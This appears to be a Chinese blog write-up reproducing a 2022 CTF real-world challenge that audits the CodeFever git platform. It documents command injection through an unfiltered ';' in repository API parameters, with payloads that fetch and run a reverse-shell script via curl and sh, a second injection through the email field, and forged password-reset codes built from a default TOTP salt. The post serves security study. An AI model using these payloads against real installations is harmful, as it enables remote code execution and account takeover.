title: 2022西湖论剑 real world git复现
author: bmth
tags:
  - CMS
top_img: 'https://img-blog.csdnimg.cn/e2e4d234c0bd42a68359fa7e9263eaa1.png'
cover: 'https://img-blog.csdnimg.cn/e2e4d234c0bd42a68359fa7e9263eaa1.png'
categories:
  - 代码审计
date: 2023-07-19 17:40:00
---
![](https://img-blog.csdnimg.cn/e2e4d234c0bd42a68359fa7e9263eaa1.png)

终于忙完项目了，没啥事，继续拿以前没做出来的题审计，还是tcl，得加强代码审计能力

## 环境搭建
先下载个源码，直接选择最新版本：`git clone https://github.com/PGYER/codefever.git`
参考官方文档，就直接用 docker 搭建，一行命令搞定
```
docker container run \
  -d --privileged=true --name codefever \
  -p 8081:80 -p 22:22 \
  -v ~/config/db:/var/lib/mysql \
  -v ~/config/env:/data/www/codefever-community/env \
  -v ~/config/logs:/data/www/codefever-community/application/logs \
  -v ~/config/git-storage:/data/www/codefever-community/git-storage \
  -v ~/config/file-storage:/data/www/codefever-community/file-storage \
  -it pgyer/codefever-community
```
修改一下web端口，访问即可
![](https://img-blog.csdnimg.cn/4cb4621bb5154f028f29665243c09dbc.png)

默认管理员用户: `root@codefever.cn`, 密码: `123456`

审计前可以看看issues，[https://github.com/PGYER/codefever/issues](https://github.com/PGYER/codefever/issues)

## 代码审计
先看看框架，主要就是 application 目录下的文件

看到`application/libraries/service/Network/Request.php`
所以在请求的时候一定得加上header头：`Accept: application/json`
![](https://img-blog.csdnimg.cn/6eab6096da094d5e9290216ce607c9a5.png)

接着看到`application/libraries/api_controller.php`，发现是使用的CodeIgniter即CI框架
![](https://img-blog.csdnimg.cn/89845bf4ec064d3db07e55c2635da125.png)

这里的`_remap`方法就是 controllers 的访问方法，即`/user/login`就是调用`application/controllers/user.php`类的 login 方法
同样也写了 api 的访问方法
![](https://img-blog.csdnimg.cn/a3efceb5753144d182ee38b8ddb264db.png)

即 get 传入`/api/user/info`就是调用`application/controllers/api/user.php`类的 info_get 方法

### 后台命令执行
前提是 config.template.yaml 文件中的 allowRegister 为 true ，我们可以注册账号

看到`application/controllers/api/user.php`
![](https://img-blog.csdnimg.cn/cb294540f00b4bd6819ced5dcf9219c3.png)

注册成功后访问`/api/user/info`，可以拿到用户信息
![](https://img-blog.csdnimg.cn/a0ed590f6b1441cc85c68231736aa9c9.png)

这里的 id 就是 u_key 
```php
public function normalize(array $list, bool $extra = FALSE)
    {
        $result = [];

        foreach ($list as $item) {
            array_push($result, [
                'id' => $item['u_key'],
                'icon' => $item['u_avatar'],
                'name' => $item['u_name'],
                'email' => $item['u_email'],
                'phoneCode' => $item['u_calling_code'],
                'phoneNumber' => $item['u_tel'],
                'team' => $item['u_team'],
                'role' => $item['u_role'],
                'notification' => (int) $item['u_notification_status'],
                'mfaEnabled' => $item['u_2fa'] ? TRUE : FALSE,
                'admin' => $item['u_admin'] ? TRUE : FALSE,
                'emails' => $this->getCommitEmails($item, !$extra),
                'unReadNotification' => $extra ? $this->notificationModel->unReadNotificationCount($item['u_key']) : 0,
                'status' => $item['u_status'] == COMMON_STATUS_NORMAL,
                'host' => YAML_HOST,
                'ssh' => YAML_SSH,
            ]);
        }
        return $result;
    }
```
同理我们可以创建一个仓库，`/api/repository/list`拿到 r_key

全局查找命令执行函数，可以看到`application/libraries/service/Utility/Command.php`
![](https://img-blog.csdnimg.cn/f50d3204c3464b439c1c6811e9f59bb6.png)

对`$command`数组使用空格连接，然后执行命令

可以使用idea查找用法，找到所有命令执行的点进行分析
#### blameInfo_get
看到`application/controllers/api/repository.php`的 blameInfo_get 方法
![](https://img-blog.csdnimg.cn/d8c4f35465d448068a626ab0e30a12ab.png)

get传参，`$revision、$filepath`的值可控，然后调用了getBlameInfo方法，跟进`application/models/repository_model.php`
![](https://img-blog.csdnimg.cn/6e3b108a04974429911687bfd50b3811.png)

使用`Command::wrapArgument`进行过滤，然后带入到`Command::run`命令执行，看看过滤的代码
![](https://img-blog.csdnimg.cn/47b5a86f3298436bacee400e0f7a6358.png)

可以看到循环进行正则匹配，直到`$result === $argument`
```
\s 匹配空白符(等价于[\r\n\t\f\v ])
\` 按字面匹配 字符 `，(区分大小写)
\' 按字面匹配 字符 '，(区分大小写)
\" 按字面匹配 字符 "，(区分大小写)
\$ 按字面匹配 字符 $，(区分大小写)
\| 按字面匹配 字符 |，(区分大小写)
```
可以注意到竟然没有过滤`;`，导致rce
![](https://img-blog.csdnimg.cn/b02ae26097bc4b04a6819dc0275a5923.png)

利用的话由于我们的用户是git，没有写的权限，可以wget下载反弹shell文件，然后sh执行
```
&revision=;curl&path=http://192.168.111.1:8000/shell.sh>/tmp/1
&revision=;sh&path=/tmp/1
```
![](https://img-blog.csdnimg.cn/b1a6ade3184747ae9082140990f33931.png)

成功反弹shell rce

#### config_get
在github上看到一个已修复的命令执行：[https://github.com/PGYER/codefever/issues/136](https://github.com/PGYER/codefever/issues/136)
![](https://img-blog.csdnimg.cn/2fa9e5337a0b4c328a0683214249c380.png)

修复方法就是使用`Command::wrapArgument`过滤，但这根本是治标不治本！

看到`application/models/repository_model.php`的execCommand方法，也就是漏洞修复的地方
![](https://img-blog.csdnimg.cn/695860e5c22441ca8e5eca838dad76dc.png)

这里将`$email`和`$name`拼接到命令执行的代码中，然后执行`Command::batch`，return 命令执行的结果

找一下`$commandType`为 GIT_COMMAND_QUERY ，然后存在返回值的方法

看到`application/controllers/api/repository.php`的 config_get 方法
![](https://img-blog.csdnimg.cn/083e674331a54838ae1a5d326544a637.png)

将结果输出，并且看到其中的 getTagList 方法
![](https://img-blog.csdnimg.cn/97d0d388f90d4680922cc9adc2ce38e7.png)

正则匹配任意字符并返回，所以回显成立

简单验证一下，由于前端 js 进行了校验，所以在修改个人信息处抓包
![](https://img-blog.csdnimg.cn/c7c9fc574d6a4c78b6e5f40a01f2b4ca.png)

在邮箱最后面添加`;{pwd,}`，随后带着 rKey 访问`/api/repository/config`
![](https://img-blog.csdnimg.cn/14d75d658d02445da12691b1f5e9c200.png)

成功命令执行并看到返回结果，分析可以发现不止这一个点存在漏洞，就不多说了

### 邮箱验证默认密钥
还修复了一个邮箱验证码的问题：[https://github.com/PGYER/codefever/issues/135](https://github.com/PGYER/codefever/issues/135)
![](https://img-blog.csdnimg.cn/c421a83cf7a14ae2a0458ac9308ae908.png)

但是如果使用的docker搭建，没有特定修改过的话，那么 salt 就是默认值
```
# totp settings (for verification code generating)
totp:
  salt: <totp_salt_for_codefever>
```

漏洞主要看到`application/controllers/user.php`的 getResetPasswordCode 方法
![](https://img-blog.csdnimg.cn/fcec289f48fc4e6cbad70dbec455cbf9.png)

使用的`TOTP::generate`生成的验证码，看到`application/libraries/service/Utility/TOTP.php`
```php
<?php
// this function use to generated uuid
namespace service\Utility;

class TOTP {

    const SALT = 'codefever_salt';
    const TOTP_REFRESH_INTERVAL = 30;
    const TOTP_CHECK_WINDOW_MIN = -10;
    const TOTP_CHECK_WINDOW_MAX = 10;
    const PASSWORD_LENGTH = 6;

    static private function hashInput (string $input) {
        $salt = self::SALT;
        if (TOTP_SALT) {
            $salt = TOTP_SALT;
        }

        $input = $input ? $input : self::SALT;

        return hash('sha256', md5($input) . md5($salt), FALSE);
    }

    static private function genTotp (string $hashedInput, int $timestamp) {
        $sequence = floor($timestamp / 30);
        $code = hash_hmac('sha256', $hashedInput . md5($sequence), md5($sequence), TRUE);

        $finalValue = 0;
        $index = 0;

        do {
            $finalValue += ord($code[$index]);
            $finalValue = $finalValue << 2;
            $index++;
        } while (isset($code[$index]));

        return $finalValue;
    }

    static private function trimTotp (int $sourceTotp) {
        $trimedTotp = $sourceTotp % pow(10, self::PASSWORD_LENGTH);
        $format = "%'.0". self::PASSWORD_LENGTH ."u";
        return sprintf($format, abs($trimedTotp));
    }


    static function generate(string $input) {
        return self::trimTotp(self::genTotp(self::hashInput($input), time()));
    }

    static function check(string $input, string $code) {
        $hashedInput = self::hashInput($input);
        $currentTime = time();
        for (
            $windowIndex = self::TOTP_CHECK_WINDOW_MIN;
            $windowIndex <= self::TOTP_CHECK_WINDOW_MAX;
            $windowIndex++
        ) {
            if (
                $code === self::trimTotp(
                    self::genTotp(
                        $hashedInput, 
                        $currentTime + ($windowIndex * self::TOTP_REFRESH_INTERVAL)
                    )
                )
            ) {
                return TRUE;
            }
        }

        return FALSE;
    }
}
```
发现 salt 是一个指定的固定值，并且存在一个前后300秒的误差
![](https://img-blog.csdnimg.cn/3124916236b14b3099a00e2e14ff229a.png)

我们设置成默认的 salt 值，然后执行
```php
$email = 'root@codefever.cn';
echo TOTP::generate($email);
```
就可以用得到的验证码重置任意账号的密码了
![](https://img-blog.csdnimg.cn/601da6de7c1749ed8e1ef2a3ec909859.png)

参考：
[ 西湖论剑 初赛 writeup by or4nge](https://mp.weixin.qq.com/s/cVLoks6tq2emTRYWasuyvg)
[ 2023西湖论剑web-writeup题解wp](https://mp.weixin.qq.com/s/WnIhWkNsYB3TR1S1LItuqA)
